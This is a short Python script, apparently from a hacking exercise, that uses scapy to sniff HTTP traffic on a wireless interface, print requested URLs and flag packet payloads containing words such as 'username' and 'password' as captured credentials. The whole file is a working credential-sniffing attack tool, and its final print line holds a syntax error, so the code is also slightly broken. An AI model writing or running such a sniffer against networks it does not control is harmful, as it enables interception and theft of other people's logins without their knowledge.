#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packets)

def get_urls(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    
def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load

def process_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_urls(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible Username and Password >> " + login_info "\n\n")

sniff("wlp6s0")